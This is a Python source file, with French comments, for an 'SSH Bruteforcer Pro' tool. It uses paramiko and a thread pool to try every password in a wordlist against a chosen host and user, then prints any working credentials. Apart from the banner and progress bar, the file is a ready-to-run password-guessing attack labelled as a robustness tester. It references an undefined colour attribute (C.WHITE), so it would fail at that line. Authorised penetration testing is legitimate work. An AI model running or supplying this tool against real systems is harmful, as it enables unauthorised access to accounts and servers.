#!/usr/bin/env python3
"""
🔐 SSH Bruteforcer Pro
Outil de test de robustesse des identifiants SSH.
"""

import paramiko
import argparse
import sys
import time
import threading
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

# ──────────────────────────────────────────────────────────────
# Couleurs ANSI & Style (Cohérence avec network_scanner.py)
# ──────────────────────────────────────────────────────────────
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    RED     = "\033[38;5;196m"
    GREEN   = "\033[38;5;82m"
    YELLOW  = "\033[38;5;226m"
    BLUE    = "\033[38;5;45m"
    CYAN    = "\033[38;5;51m"
    GRAY    = "\033[38;5;244m"
    ORANGE  = "\033[38;5;208m"

BANNER = f"""
{C.ORANGE}  ____             _          {C.YELLOW}  _  {C.RESET}
{C.ORANGE} |  _ \           | |         {C.YELLOW} | | {C.RESET}
{C.ORANGE} | |_) |_ __ _   _| |_ ___    {C.YELLOW} | | {C.RESET}
{C.ORANGE} |  _ <| '__| | | | __/ _ \   {C.YELLOW} |_| {C.RESET}
{C.ORANGE} | |_) | |  | |_| | ||  __/   {C.YELLOW}  _  {C.RESET}
{C.ORANGE} |____/|_|   \__,_|\__\___|   {C.YELLOW} |_| {C.RESET}
{C.GRAY}        SSH Authentication Tester v1.0{C.RESET}
"""

class Progress:
    def __init__(self, total, label=""):
        self.total = total
        self.current = 0
        self.label = label
        self._lock = threading.Lock()

    def increment(self):
        with self._lock:
            self.current += 1
            pct = (self.current / self.total) * 100
            bar = "█" * int(pct/5) + "░" * (20 - int(pct/5))
            sys.stderr.write(f"\r  {C.GRAY}{self.label:<15}{C.RESET} {C.ORANGE}[{bar}]{C.RESET} {C.BOLD}{int(pct)}%{C.RESET} ")
            sys.stderr.flush()

# ──────────────────────────────────────────────────────────────
# Logique de Bruteforce
# ──────────────────────────────────────────────────────────────

found_flag = threading.Event() # Pour arrêter tous les threads si on trouve le MDP

def ssh_connect(ip, user, password, port=22, timeout=3):
    if found_flag.is_set():
        return None

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(hostname=ip, port=port, username=user, password=password, 
                       timeout=timeout, allow_agent=False, look_for_keys=False)
        found_flag.set() # Succès !
        return password
    except paramiko.AuthenticationException:
        return None # Mauvais mot de passe
    except (socket.timeout, paramiko.SSHException):
        return "ERROR" # Problème réseau
    finally:
        client.close()

def main():
    parser = argparse.ArgumentParser(description="Bruteforce SSH simple")
    parser.add_argument("-t", "--target", required=True, help="IP de la cible")
    parser.add_argument("-u", "--user", required=True, help="Utilisateur cible")
    parser.add_argument("-w", "--wordlist", required=True, help="Fichier de mots de passe (.txt)")
    parser.add_argument("-p", "--port", type=int, default=22, help="Port SSH (défaut: 22)")
    parser.add_argument("--threads", type=int, default=10, help="Nombre de threads (défaut: 10)")
    args = parser.parse_args()

    print(BANNER)

    # Chargement des mots de passe
    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{C.RED}[!] Erreur : Fichier '{args.wordlist}' introuvable.{C.RESET}")
        return

    print(f" {C.BOLD}[*]{C.RESET} Cible      : {C.CYAN}{args.target}:{args.port}{C.RESET}")
    print(f" {C.BOLD}[*]{C.RESET} Utilisateur: {C.WHITE}{args.user}{C.RESET}")
    print(f" {C.BOLD}[*]{C.RESET} Tentatives : {len(passwords)}\n")

    progress = Progress(len(passwords), "Attacking")
    start_time = time.time()
    valid_password = None

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(ssh_connect, args.target, args.user, pwd, args.port): pwd for pwd in passwords}
        
        for f in as_completed(futures):
            res = f.result()
            progress.increment()
            
            if res and res != "ERROR":
                valid_password = res
                break # On a trouvé, on sort de la boucle de récupération

    print("\n" + "═"*50)
    if valid_password:
        print(f"  {C.GREEN}{C.BOLD}[SUCCESS]{C.RESET} Credentials found !")
        print(f"  {C.BOLD}User     :{C.RESET} {args.user}")
        print(f"  {C.BOLD}Password :{C.RESET} {C.GREEN}{valid_password}{C.RESET}")
    else:
        print(f"  {C.RED}[FAILED]{C.RESET} No valid password found in wordlist.")
    print("═"*50)
    
    print(f"\n{C.GRAY}Temps écoulé : {time.time()-start_time:.2f}s{C.RESET}")

if __name__ == "__main__":
    main()
